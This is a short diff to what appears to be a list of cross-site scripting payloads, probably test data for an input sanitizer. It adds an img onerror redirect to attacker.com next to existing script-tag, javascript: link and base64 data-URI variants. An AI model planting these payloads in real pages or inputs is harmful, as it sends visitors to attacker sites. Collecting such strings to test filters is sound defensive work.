@@ -4,3 +4,4 @@
 <script>window.location='https://attacker.com'</script>
 <a href="javascript:window.location='https://attacker.com'">Click Me</a>
 <script>location.href='data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8vYXR0YWNrZXIuY29tIjs8L3NjcmlwdD4='</script>
+<img src="invalid" onerror="window.location='https://attacker.com'">
